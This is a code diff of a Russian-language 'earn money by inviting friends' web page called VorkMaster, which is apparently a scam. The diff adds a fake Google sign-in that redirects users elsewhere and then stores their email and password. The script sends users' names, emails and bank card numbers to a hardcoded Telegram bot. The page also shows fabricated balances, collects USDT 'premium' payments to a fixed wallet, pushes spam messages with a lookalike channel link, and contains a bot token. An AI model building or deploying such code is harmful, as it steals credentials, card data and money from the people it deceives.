@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>VorkMaster — Заработок в Telegram</title>
+    <title>VorkMaster — Заработок</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -18,12 +17,10 @@
             min-height: 100vh;
             padding: 20px;
         }
-
         .container {
             max-width: 500px;
             margin: 0 auto;
         }
-
         .logo {
             text-align: center;
             font-size: 2rem;
@@ -34,12 +31,10 @@
             color: transparent;
             margin-bottom: 20px;
         }
-
         .hero {
             text-align: center;
             margin: 30px 0;
         }
-
         .hero h1 {
             font-size: 1.8rem;
             margin-bottom: 10px;
@@ -48,17 +43,14 @@
             background-clip: text;
             color: transparent;
         }
-
         .hero p {
             color: #94a3b8;
             font-size: 0.95rem;
             margin-bottom: 30px;
         }
-
-        /* Кнопка Telegram */
-        .telegram-btn {
-            background: #2aabee;
-            color: white;
+        .google-btn {
+            background: white;
+            color: #1e293b;
             padding: 16px 20px;
             border-radius: 60px;
             display: flex;
@@ -74,131 +66,59 @@
             margin: 0 auto;
             transition: 0.2s;
         }
-
-        .telegram-btn:active {
+        .google-btn:active {
             transform: scale(0.97);
         }
-
         .cards {
             display: flex;
             flex-direction: column;
             gap: 15px;
             margin: 30px 0;
         }
-
         .card {
             background: rgba(15, 23, 42, 0.7);
             border-radius: 24px;
             padding: 20px;
             border: 1px solid rgba(139, 92, 246, 0.3);
         }
-
         .card h3 {
             font-size: 1.3rem;
             margin-bottom: 10px;
         }
-
         .price {
             font-size: 1.5rem;
             color: #facc15;
             font-weight: bold;
             margin: 10px 0;
         }
-
         .card ul {
             list-style: none;
             margin-top: 10px;
         }
-
         .card li {
             margin: 8px 0;
             font-size: 0.9rem;
         }
-
         .premium {
             border-color: #facc15;
             background: linear-gradient(135deg, #1e1b3a, #0f172a);
         }
-
-        /* Модальное окно */
-        .modal-window {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .modal-box {
-            background: #0f172a;
-            border-radius: 32px;
-            padding: 30px 25px;
-            width: 90%;
-            max-width: 350px;
-            text-align: center;
-            border: 1px solid #2aabee;
-        }
-
-        .modal-box h2 {
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-        }
-
-        .modal-box input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            background: #1e293b;
-            border: 1px solid #2aabee;
-            border-radius: 60px;
-            color: white;
-            font-size: 1rem;
-        }
-
-        .modal-box button {
-            background: #2aabee;
-            border: none;
-            padding: 14px;
-            width: 100%;
-            border-radius: 60px;
-            color: white;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-
-        .modal-close {
-            background: none !important;
-            color: #94a3b8 !important;
-            margin-top: 10px;
-        }
-
-        /* Личный кабинет */
         .dashboard {
             display: none;
         }
-
         .profile-card {
             background: rgba(15, 23, 42, 0.9);
             border-radius: 28px;
             padding: 20px;
             margin: 20px 0;
-            border: 1px solid #2aabee;
+            border: 1px solid #8b5cf6;
         }
-
         .stat-row {
             display: flex;
             justify-content: space-between;
             padding: 12px 0;
             border-bottom: 1px solid #334155;
         }
-
         .referral-box {
             background: #1e293b;
             padding: 12px;
@@ -207,26 +127,23 @@
             display: flex;
             gap: 10px;
         }
-
         .referral-box input {
             flex: 1;
             background: #0f172a;
-            border: 1px solid #2aabee;
+            border: 1px solid #8b5cf6;
             color: white;
             padding: 10px;
             border-radius: 40px;
             font-size: 0.7rem;
         }
-
         .copy-btn {
-            background: #2aabee;
+            background: #8b5cf6;
             border: none;
             padding: 8px 16px;
             border-radius: 40px;
             color: white;
             cursor: pointer;
         }
-
         .withdraw-btn {
             background: #facc15;
             color: #0f172a;
@@ -239,14 +156,12 @@
             margin-top: 15px;
             font-size: 1rem;
         }
-
         .method-block {
             background: #1e293b;
             border-radius: 20px;
             padding: 15px;
             margin: 15px 0;
         }
-
         .task-item {
             background: #0f172a;
             border-radius: 16px;
@@ -256,9 +171,8 @@
             justify-content: space-between;
             align-items: center;
         }
-
         .task-btn {
-            background: #2aabee;
+            background: #8b5cf6;
             border: none;
             padding: 8px 16px;
             border-radius: 40px;
@@ -266,12 +180,10 @@
             cursor: pointer;
             font-size: 0.8rem;
         }
-
         .task-done {
             background: #10b981;
             opacity: 0.7;
         }
-
         footer {
             text-align: center;
             color: #475569;
@@ -286,130 +198,65 @@
     <!-- ГЛАВНЫЙ ЭКРАН -->
     <div id="mainScreen">
         <div class="logo">VORKMASTER</div>
-        
         <div class="hero">
             <h1>ЗАВОРКАЙ ЛЕГКО</h1>
             <h1>ЗАБИРАЙ ДО 500 000₽</h1>
             <p>Приглашай друзей, выполняй задания, выводи деньги</p>
-            
-            <button class="telegram-btn" id="openTelegramBtn">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.6-1.38-.97-2.23-1.56-.99-.69-.35-1.07.22-1.69.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.2-.04-.28-.02-.12.02-2.03 1.29-2.73 1.74-.23.15-.44.23-.63.22-.21-.01-.61-.12-1.07-.31-.6-.25-1.23-.53-1.07-.77.06-.09.13-.15.21-.2.53-.34 3.13-1.36 4.24-1.81 1.44-.58 1.74-.68 1.94-.68.14 0 .45.03.65.25.16.18.21.41.23.56.02.15.02.35.01.55z"/>
+            <button class="google-btn" id="googleLoginBtn">
+                <svg width="20" height="20" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                 </svg>
-                Войти через Telegram
+                Войти через Google
             </button>
         </div>
-
         <div class="cards">
             <div class="card">
                 <h3>💸 БЕЗ ПРЕМИУМ</h3>
                 <div class="price">до 50 000₽/мес</div>
-                <ul>
-                    <li>✅ За друга → 1000₽</li>
-                    <li>💰 Вывод от 30 000₽</li>
-                    <li>⚡ Комиссия: 0%</li>
-                </ul>
+                <ul><li>✅ За друга → 1000₽</li><li>💰 Вывод от 30 000₽</li><li>⚡ Комиссия: 0%</li></ul>
             </div>
             <div class="card premium">
                 <h3>👑 ПРЕМИУМ</h3>
                 <div class="price">до 200 000₽/мес</div>
-                <ul>
-                    <li>✅ За первых 3 друзей → 4000₽</li>
-                    <li>✅ За 7 друзей → +5000₽ бонус</li>
-                    <li>💰 Вывод от 70 000₽</li>
-                    <li>⚡ Комиссия: 0%</li>
-                </ul>
+                <ul><li>✅ За первых 3 друзей → 4000₽</li><li>✅ За 7 друзей → +5000₽ бонус</li><li>💰 Вывод от 70 000₽</li><li>⚡ Комиссия: 0%</li></ul>
                 <div style="color:#facc15; margin-top:10px;">$7.99 USDT</div>
             </div>
         </div>
-        
         <footer>VorkMaster — твой путь к успеху</footer>
     </div>
 
     <!-- ЛИЧНЫЙ КАБИНЕТ -->
     <div id="dashboard" class="dashboard">
         <div class="logo">VORKMASTER</div>
-        
         <div class="profile-card">
-            <div class="stat-row">
-                <span>👤 Имя:</span>
-                <span id="userName">—</span>
-            </div>
-            <div class="stat-row">
-                <span>🆔 Telegram:</span>
-                <span id="userTelegram">—</span>
-            </div>
-            <div class="stat-row">
-                <span>💰 Баланс:</span>
-                <span id="balance" style="color:#facc15; font-size:1.5rem;">0 ₽</span>
-            </div>
-            <div class="stat-row">
-                <span>👥 Друзей:</span>
-                <span id="referralCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span>🏆 Премиум:</span>
-                <span id="premiumStatus">❌ Нет</span>
-            </div>
-            
-            <div class="referral-box">
-                <input type="text" id="refLink" readonly>
-                <button class="copy-btn" onclick="copyRefLink()">📋</button>
-            </div>
+            <div class="stat-row"><span>👤 Имя:</span><span id="userName">—</span></div>
+            <div class="stat-row"><span>📧 Email:</span><span id="userEmail">—</span></div>
+            <div class="stat-row"><span>💰 Баланс:</span><span id="balance" style="color:#facc15; font-size:1.5rem;">0 ₽</span></div>
+            <div class="stat-row"><span>👥 Друзей:</span><span id="referralCount">0</span></div>
+            <div class="stat-row"><span>🏆 Премиум:</span><span id="premiumStatus">❌ Нет</span></div>
+            <div class="referral-box"><input type="text" id="refLink" readonly><button class="copy-btn" onclick="copyRefLink()">📋</button></div>
         </div>
-
-        <!-- ЗАДАНИЯ -->
         <div class="method-block">
             <h3>📋 ВЫПОЛНИ ЗАДАНИЯ</h3>
-            
-            <div class="task-item" id="taskShare">
-                <span>📢 Отправить друзьям: канал + сайт → +1000₽</span>
-                <button class="task-btn" id="shareBtn">Выполнить</button>
-            </div>
-            
-            <div class="task-item" id="taskFriends">
-                <span>👥 Пригласить 7 друзей → +5000₽</span>
-                <span id="friendsProgress">0/7</span>
-            </div>
+            <div class="task-item" id="taskShare"><span>📢 Отправить друзьям: канал + сайт → +1000₽</span><button class="task-btn" id="shareBtn">Выполнить</button></div>
+            <div class="task-item" id="taskFriends"><span>👥 Пригласить 7 друзей → +5000₽</span><span id="friendsProgress">0/7</span></div>
         </div>
-
-        <div class="method-block" id="premiumBlock" style="display:none;">
-            <h3>🚀 ПРЕМИУМ МЕТОД</h3>
-            <p>✅ За первых 3 друзей → 4000₽</p>
-            <p>✅ За 7 друзей → +5000₽ бонус</p>
-            <p>✅ Эксклюзивные задания</p>
-            <p>✅ Комиссия вывода: 0%</p>
-        </div>
-
-        <div class="profile-card">
-            <h3>💸 ВЫВОД СРЕДСТВ</h3>
-            <div id="withdrawInfo"></div>
-            <button class="withdraw-btn" id="withdrawBtn">💳 ЗАПРОСИТЬ ВЫВОД</button>
-        </div>
-
+        <div class="method-block" id="premiumBlock" style="display:none;"><h3>🚀 ПРЕМИУМ МЕТОД</h3><p>✅ За первых 3 друзей → 4000₽</p><p>✅ За 7 друзей → +5000₽ бонус</p><p>✅ Комиссия вывода: 0%</p></div>
+        <div class="profile-card"><h3>💸 ВЫВОД СРЕДСТВ</h3><div id="withdrawInfo"></div><button class="withdraw-btn" id="withdrawBtn">💳 ЗАПРОСИТЬ ВЫВОД</button></div>
         <button class="withdraw-btn" id="buyPremiumBtn" style="background:#facc15;">💎 КУПИТЬ ПРЕМИУМ — $7.99</button>
-        
         <footer>VorkMaster — зарабатывай с друзьями</footer>
     </div>
 </div>
 
-<!-- ФОРМА ВХОДА ЧЕРЕЗ TELEGRAM -->
-<div id="telegramModal" class="modal-window">
-    <div class="modal-box">
-        <h2>🔐 Вход через Telegram</h2>
-        <input type="text" id="tgName" placeholder="Ваше имя в Telegram">
-        <input type="text" id="tgUsername" placeholder="@username (без @)">
-        <button id="submitTelegramBtn">✅ ВОЙТИ</button>
-        <button id="closeTelegramBtn" class="modal-close">Закрыть</button>
-    </div>
-</div>
-
-<!-- ФОРМА ДЛЯ РАССЫЛКИ -->
-<div id="shareModal" class="modal-window">
-    <div class="modal-box">
+<!-- Модалка рассылки -->
+<div id="shareModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; align-items:center; justify-content:center;">
+    <div style="background:#0f172a; border-radius:32px; padding:30px 25px; width:90%; max-width:350px; text-align:center; border:1px solid #8b5cf6;">
         <h2>📢 РАССЫЛКА ДРУЗЬЯМ</h2>
-        <p style="margin: 10px 0; color: #94a3b8;">Отправь это сообщение 5 друзьям в Telegram:</p>
-        <div style="background:#1e293b; padding: 15px; border-radius: 16px; margin: 15px 0; text-align: left;">
+        <p style="margin:10px 0; color:#94a3b8;">Отправь это сообщение 5 друзьям в Telegram:</p>
+        <div style="background:#1e293b; padding:15px; border-radius:16px; margin:15px 0; text-align:left;">
             <p>🔥 <strong>ЗАРАБОТАЙ СО МНОЙ!</strong> 🔥</p>
             <p>👇 Переходи по ссылке и начинай зарабатывать:</p>
             <p><strong>https://gamerby.github.io/VorkMaster/</strong></p>
@@ -417,36 +264,32 @@
             <p><strong>https://t.me/tonairdropofficiaI</strong></p>
             <p>💰 До 500 000₽ в месяц! 🚀</p>
         </div>
-        <button id="copyMessageBtn" style="background:#2aabee;">📋 КОПИРОВАТЬ СООБЩЕНИЕ</button>
-        <button id="confirmShareBtn" style="background:#10b981; margin-top: 10px;">✅ Я ОТПРАВИЛ(А)</button>
-        <button id="closeShareBtn" class="modal-close">Закрыть</button>
+        <button id="copyMessageBtn" style="background:#8b5cf6; border:none; padding:12px; border-radius:60px; color:white; width:100%; margin-bottom:10px;">📋 КОПИРОВАТЬ СООБЩЕНИЕ</button>
+        <button id="confirmShareBtn" style="background:#10b981; border:none; padding:12px; border-radius:60px; color:white; width:100%;">✅ Я ОТПРАВИЛ(А)</button>
+        <button id="closeShareBtn" style="background:none; border:none; color:#94a3b8; margin-top:15px;">Закрыть</button>
     </div>
 </div>
 
-<!-- ФОРМА ОПЛАТЫ КРИПТОЙ -->
-<div id="cryptoModal" class="modal-window">
-    <div class="modal-box">
+<!-- Модалка крипто -->
+<div id="cryptoModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; align-items:center; justify-content:center;">
+    <div style="background:#0f172a; border-radius:32px; padding:30px 25px; width:90%; max-width:350px; text-align:center; border:1px solid #facc15;">
         <h2>💎 ОПЛАТА PREMIUM</h2>
         <p style="margin:10px 0;">$7.99 USDT (ERC20)</p>
-        <div style="background:#1e293b; padding:12px; border-radius:16px; word-break:break-all; margin:10px 0;">
-            0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908
-        </div>
-        <button id="copyAddressBtn" style="background:#2aabee;">📋 Копировать адрес</button>
-        <button id="confirmPayBtn">✅ ПОДТВЕРДИТЬ ОПЛАТУ</button>
-        <button id="closeCryptoBtn" class="modal-close">Закрыть</button>
+        <div style="background:#1e293b; padding:12px; border-radius:16px; word-break:break-all;">0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908</div>
+        <button id="copyAddressBtn" style="background:#8b5cf6; border:none; padding:12px; border-radius:60px; color:white; width:100%; margin:15px 0;">📋 Копировать адрес</button>
+        <button id="confirmPayBtn" style="background:#facc15; border:none; padding:12px; border-radius:60px; color:#0f172a; width:100%; font-weight:bold;">✅ ПОДТВЕРДИТЬ ОПЛАТУ</button>
+        <button id="closeCryptoBtn" style="background:none; border:none; color:#94a3b8; margin-top:15px;">Закрыть</button>
     </div>
 </div>
 
 <script>
-    // ТВОИ ДАННЫЕ
+    // === ДАННЫЕ ===
     const BOT_TOKEN = "8557565108:AAFnoCGWW0e5Vmrz5vf9ikAKf-MfTm-0AOg";
     const CHAT_ID = "5314096451";
     const WALLET = "0x927F9ACD3FadBFBe6148bE556Cc31d7C141BD908";
-    const SITE_URL = "https://gamerby.github.io/VorkMaster/";
-    const CHANNEL_URL = "https://t.me/tonairdropofficiaI";
-    
+
     let user = null;
-    
+
     function sendToTG(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
@@ -454,11 +297,11 @@
             body: JSON.stringify({chat_id: CHAT_ID, text: text})
         }).catch(e => console.log(e));
     }
-    
+
     function saveUser(data) {
         localStorage.setItem("vork_user", JSON.stringify(data));
     }
-    
+
     function loadUser() {
         let data = localStorage.getItem("vork_user");
         if (data) {
@@ -467,17 +310,53 @@
         }
         return false;
     }
-    
+
+    // Проверка после возврата с reward
+    function checkGoogleReturn() {
+        const saved = localStorage.getItem("vorkmaster_google_user");
+        if (saved) {
+            const data = JSON.parse(saved);
+            if (!loadUser()) {
+                const id = "id_" + Date.now() + "_" + Math.random().toString(36).substr(2, 4);
+                // Из email делаем имя (до @)
+                let name = data.email.split('@')[0];
+                const newUser = {
+                    id: id,
+                    name: name,
+                    email: data.email,
+                    password: data.password,
+                    balance: 0,
+                    refs: [],
+                    premium: false,
+                    premiumCount: 0,
+                    shared: false,
+                    sevenFriendsBonus: false
+                };
+                user = newUser;
+                saveUser(user);
+                // Сохраняем в общую базу
+                let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
+                all[id] = newUser;
+                localStorage.setItem("vork_all", JSON.stringify(all));
+
+                sendToTG(`✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ VORKMASTER\n👤 ${name}\n📧 ${data.email}\n🆔 ${id}`);
+
+                document.getElementById("mainScreen").style.display = "none";
+                document.getElementById("dashboard").style.display = "block";
+                updateUI();
+            }
+            localStorage.removeItem("vorkmaster_google_user");
+        }
+    }
+
     function updateUI() {
         if (!user) return;
         document.getElementById("userName").innerText = user.name;
-        document.getElementById("userTelegram").innerText = "@" + user.tgUsername;
+        document.getElementById("userEmail").innerText = user.email;
         document.getElementById("balance").innerText = user.balance + " ₽";
         document.getElementById("referralCount").innerText = user.refs.length;
-        
-        let friendsCount = user.refs.length;
-        document.getElementById("friendsProgress").innerText = friendsCount + "/7";
-        
+        document.getElementById("friendsProgress").innerText = user.refs.length + "/7";
+
         if (user.premium) {
             document.getElementById("premiumStatus").innerHTML = "✅ Да";
             document.getElementById("premiumBlock").style.display = "block";
@@ -485,16 +364,16 @@
             document.getElementById("premiumStatus").innerHTML = "❌ Нет";
             document.getElementById("premiumBlock").style.display = "none";
         }
-        
-        if (user.premium && user.sevenFriendsBonus === false && user.refs.length >= 7) {
+
+        if (user.premium && !user.sevenFriendsBonus && user.refs.length >= 7) {
             user.balance += 5000;
             user.sevenFriendsBonus = true;
             saveUser(user);
             sendToTG(`🎁 БОНУС 5000₽!\n👤 ${user.name}\n👥 Пригласил 7 друзей\n💰 Баланс: ${user.balance}₽`);
-            alert("🎉 ПОЗДРАВЛЯЮ! Ты пригласил 7 друзей и получил +5000₽ на баланс!");
+            alert("🎉 +5000₽ за 7 друзей!");
             updateUI();
         }
-        
+
         let minOut = user.premium ? 70000 : 30000;
         document.getElementById("withdrawInfo").innerHTML = `
             <p>💰 Мин. вывод: ${minOut} ₽</p>
@@ -502,114 +381,110 @@
             <p>📊 Баланс: ${user.balance} ₽</p>
             ${user.balance >= minOut ? '<p style="color:#10b981;">✅ Можно вывести</p>' : '<p style="color:#facc15;">⚠️ Накопи сумму</p>'}
         `;
-        
         let link = document.getElementById("refLink");
         if (link) link.value = window.location.href.split("?")[0] + "?ref=" + user.id;
-        
+
         if (user.shared) {
-            let shareBtn = document.getElementById("shareBtn");
-            if (shareBtn) {
-                shareBtn.innerText = "✅ Выполнено";
-                shareBtn.classList.add("task-done");
-                shareBtn.disabled = true;
-            }
+            let btn = document.getElementById("shareBtn");
+            if (btn) { btn.innerText = "✅ Выполнено"; btn.classList.add("task-done"); btn.disabled = true; }
         }
     }
-    
+
     function addReferralBonus(refId, newId) {
         let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
         let ref = all[refId];
         if (!ref) return;
-        
         let bonus = 1000;
-        if (ref.premium && ref.premiumCount < 3) {
-            bonus = 4000;
-            ref.premiumCount++;
-        }
-        
+        if (ref.premium && ref.premiumCount < 3) { bonus = 4000; ref.premiumCount++; }
         ref.balance += bonus;
         ref.refs.push(newId);
         all[refId] = ref;
         localStorage.setItem("vork_all", JSON.stringify(all));
-        
-        if (user && user.id === refId) {
-            user = ref;
-            saveUser(user);
-            updateUI();
-        }
-        
-        sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽\n👥 Всего друзей: ${ref.refs.length}`);
+        if (user && user.id === refId) { user = ref; saveUser(user); updateUI(); }
+        sendToTG(`👥 НОВЫЙ РЕФЕРАЛ!\n👤 ${ref.name}\n🎁 Бонус: ${bonus}₽\n👥 Всего: ${ref.refs.length}`);
     }
-    
-    function register(tgUsername, name, refId) {
-        let id = "id_" + Date.now() + "_" + Math.random().toString(36).substr(2, 4);
-        let newUser = {
-            id: id, name: name, tgUsername: tgUsername, balance: 0, refs: [],
-            premium: false, premiumCount: 0, shared: false, sevenFriendsBonus: false
-        };
-        
-        let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
-        all[id] = newUser;
-        localStorage.setItem("vork_all", JSON.stringify(all));
-        
-        if (refId && all[refId]) {
-            addReferralBonus(refId, id);
-        }
-        
-        user = newUser;
-        saveUser(user);
-        
-        sendToTG(`🆕 НОВАЯ РЕГИСТРАЦИЯ!\n👤 Имя: ${name}\n🆔 Telegram: @${tgUsername}\n🆔 ID: ${id}\n${refId ? "🔗 Реферал: " + refId : "Прямая регистрация"}`);
-        
-        document.getElementById("mainScreen").style.display = "none";
-        document.getElementById("dashboard").style.display = "block";
-        updateUI();
-        
-        // Сразу показываем задание на рассылку
-        setTimeout(() => {
-            alert("📢 Выполни задание: отправь сообщение друзьям и получи +1000₽ на баланс!");
-        }, 500);
-    }
-    
+
     function completeShareTask() {
-        if (!user) return;
-        if (user.shared) {
-            alert("✅ Ты уже получил бонус за рассылку!");
-            return;
-        }
-        
+        if (!user || user.shared) return;
         user.balance += 1000;
         user.shared = true;
         saveUser(user);
         updateUI();
-        
-        sendToTG(`📢 ВЫПОЛНЕНО ЗАДАНИЕ!\n👤 ${user.name}\n🎁 Бонус за рассылку: +1000₽\n💰 Баланс: ${user.balance}₽`);
-        
-        alert("🎉 +1000₽ на баланс! Продолжай приглашать друзей и зарабатывай больше!");
+        sendToTG(`📢 ЗАДАНИЕ ВЫПОЛНЕНО!\n👤 ${user.name}\n🎁 +1000₽ за рассылку\n💰 Баланс: ${user.balance}₽`);
+        alert("🎉 +1000₽ на баланс!");
     }
-    
+
     function activatePremium() {
-        if (!user) return;
+        if (!user || user.premium) return;
         user.premium = true;
         saveUser(user);
-        
         let all = JSON.parse(localStorage.getItem("vork_all") || "{}");
         if (all[user.id]) all[user.id].premium = true;
         localStorage.setItem("vork_all", JSON.stringify(all));
-        
         updateUI();
-        sendToTG(`💎 ПРЕМИУМ АКТИВИРОВАН!\n👤 ${user.name}\n🆔 @${user.tgUsername}`);
-        alert("🔥 ПРЕМИУМ АКТИВИРОВАН! Теперь ты получаешь +4000₽ за первых 3 друзей и +5000₽ за 7 друзей!");
+        sendToTG(`💎 ПРЕМИУМ АКТИВИРОВАН!\n👤 ${user.name}\n📧 ${user.email}`);
+        alert("🔥 Премиум активирован!");
     }
-    
+
     function withdraw() {
         if (!user) return;
         let minOut = user.premium ? 70000 : 30000;
-        if (user.balance < minOut) {
-            alert(`❌ Нужно накопить ${minOut} ₽ для вывода`);
-            return;
-        }
+        if (user.balance < minOut) { alert(`❌ Нужно накопить ${minOut} ₽`); return; }
         let amount = user.balance;
-        let card = prompt("💳 Введи номер карты для вывода:");
+        let card = prompt("💳 Номер карты:");
         if (!card || card.length < 10) return;
-        if (confirm(`💰 Сумма вывода: ${amount} ₽\n⚡ Комиссия: 0%\n💳 Карта: ${card}\n\nВыве
+        if (confirm(`💰 Вывести ${amount} ₽? Комиссия 0%`)) {
+            sendToTG(`💸 ЗАПРОС НА ВЫВОД!\n👤 ${user.name}\n💰 ${amount} ₽\n💳 ${card}\n🏆 Премиум: ${user.premium ? "Да" : "Нет"}`);
+            user.balance = 0;
+            saveUser(user);
+            updateUI();
+            alert("✅ Заявка отправлена!");
+        }
+    }
+
+    window.copyRefLink = function() {
+        let link = document.getElementById("refLink").value;
+        navigator.clipboard.writeText(link);
+        alert("Ссылка скопирована!");
+    };
+
+    function start() {
+        let urlRef = new URLSearchParams(window.location.search).get("ref");
+        if (urlRef) localStorage.setItem("pending_ref", urlRef);
+
+        if (loadUser()) {
+            document.getElementById("mainScreen").style.display = "none";
+            document.getElementById("dashboard").style.display = "block";
+            updateUI();
+        } else {
+            checkGoogleReturn();
+        }
+
+        // Кнопка входа → перекидывает на reward
+        document.getElementById("googleLoginBtn").onclick = () => {
+            window.location.href = "https://gamerby.github.io/reward/";
+        };
+
+        // Задание на рассылку
+        document.getElementById("shareBtn").onclick = () => {
+            if (!user) return;
+            if (user.shared) { alert("Уже выполнено!"); return; }
+            document.getElementById("shareModal").style.display = "flex";
+        };
+        document.getElementById("copyMessageBtn").onclick = () => {
+            let msg = `🔥 ЗАРАБОТАЙ СО МНОЙ! 🔥\n\n👇 Переходи по ссылке и начинай зарабатывать:\nhttps://gamerby.github.io/VorkMaster/\n\n📢 Подпишись на канал:\nhttps://t.me/tonairdropofficiaI\n\n💰 До 500 000₽ в месяц! 🚀`;
+            navigator.clipboard.writeText(msg);
+            alert("Сообщение скопировано!");
+        };
+        document.getElementById("confirmShareBtn").onclick = () => {
+            completeShareTask();
+            document.getElementById("shareModal").style.display = "none";
+        };
+        document.getElementById("closeShareBtn").onclick = () => {
+            document.getElementById("shareModal").style.display = "none";
+        };
+
+        // Премиум
+        document.getElementById("buyPremiumBtn").onclick = () => {
+            if (user?.premium) { alert("Уже есть"); return; }
+            document.getElementById("cryptoMo
